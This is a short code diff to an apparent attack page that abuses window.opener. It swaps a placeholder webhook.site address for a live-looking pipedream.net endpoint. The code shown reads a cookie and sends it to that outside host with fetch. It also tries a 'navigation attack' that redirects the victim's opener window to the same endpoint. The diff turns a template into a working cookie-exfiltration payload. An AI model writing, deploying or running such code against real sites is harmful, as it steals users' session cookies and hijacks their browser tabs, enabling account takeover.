@@ -51,7 +51,7 @@ if (window.opener) {
             
             // Send to webhook
             let data = cookie || 'no-cookie';
-            fetch('https://webhook.site/YOUR-WEBHOOK-ID?cookie=' + encodeURIComponent(data) + '&status=success')
+            fetch('https://eo8mlj9bls9wxmp.m.pipedream.net?cookie=' + encodeURIComponent(data) + '&status=success')
                 .then(() => log('✓ Data sent to webhook!'))
                 .catch(e => log('⚠ Webhook error: ' + e.message));
                 
@@ -64,7 +64,7 @@ if (window.opener) {
         
         // Try navigation attack (cross-origin fallback)
         try {
-            window.opener.location = 'https://webhook.site/YOUR-WEBHOOK-ID?status=cross-origin-redirect';
+            window.opener.location = 'https://eo8mlj9bls9wxmp.m.pipedream.net?status=cross-origin-redirect';
             log('✓ Attempted to redirect opener');
         } catch(e2) {
             log('✗ Redirect failed: ' + e2.message);
